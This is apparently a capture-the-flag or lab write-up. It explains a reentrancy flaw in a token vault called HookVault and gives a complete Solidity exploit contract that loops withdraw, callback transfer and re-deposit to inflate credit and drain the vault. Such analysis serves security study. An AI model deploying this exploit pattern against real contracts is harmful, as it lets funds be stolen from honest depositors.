The bug is in `HookVault.withdraw`. It sends the tokens before it updates `balanceOf`, and `NotifyToken` calls `onTokenReceived` on the receiver during that transfer. `nonReentrant` blocks `deposit` and `withdraw`, but `vault.transfer` has no guard. From inside the callback the attacker can move its vault credit to a helper contract. `withdraw` then writes back the stale `bal - amount`, so the credit survives in the helper while the attacker keeps the tokens.

Each round does the following:
1. Withdraw `c`, which is the attacker's whole credit.
2. In the callback, move `c` of credit to the helper.
3. Re-deposit the `c` tokens, so the attacker has `c` credit again and the helper also has `c`.
4. Have the helper send its credit back, so the attacker's credit doubles for free.

Four rounds take the credit from 1 to 16 ether, which is more than the 11 ether of tokens in the vault. A final plain withdrawal then takes all 11 ether, and the honest users' withdrawals fail.

```solidity
pragma solidity 0.8.28;

interface IVault {
    function token() external view returns (address);
    function deposit(uint) external;
    function withdraw(uint) external;
    function transfer(address, uint) external;
    function balanceOf(address) external view returns (uint);
}

interface IToken {
    function wrap() external payable;
    function approve(address, uint) external returns (bool);
    function balanceOf(address) external view returns (uint);
}

contract Helper {
    IVault vault;
    address owner;
    constructor(address v) { vault = IVault(v); owner = msg.sender; }
    function back() external {
        vault.transfer(owner, vault.balanceOf(address(this)));
    }
}

contract Exploit {
    IVault vault;
    IToken token;
    Helper helper;
    bool mode;

    constructor(address target) payable {
        vault = IVault(target);
        token = IToken(vault.token());
        helper = new Helper(target);
        token.wrap{value: msg.value}();
        token.approve(target, type(uint).max);
        vault.deposit(msg.value);
    }

    function onTokenReceived(address, uint amount) external {
        if (mode) {
            mode = false;
            vault.transfer(address(helper), amount);
        }
    }

    function run() external {
        for (uint i = 0; i < 4; i++) {
            uint c = vault.balanceOf(address(this));
            mode = true;
            vault.withdraw(c);
            vault.deposit(c);
            helper.back();
        }
        uint bal = token.balanceOf(address(vault));
        uint cred = vault.balanceOf(address(this));
        vault.withdraw(bal < cred ? bal : cred);
    }
}
```
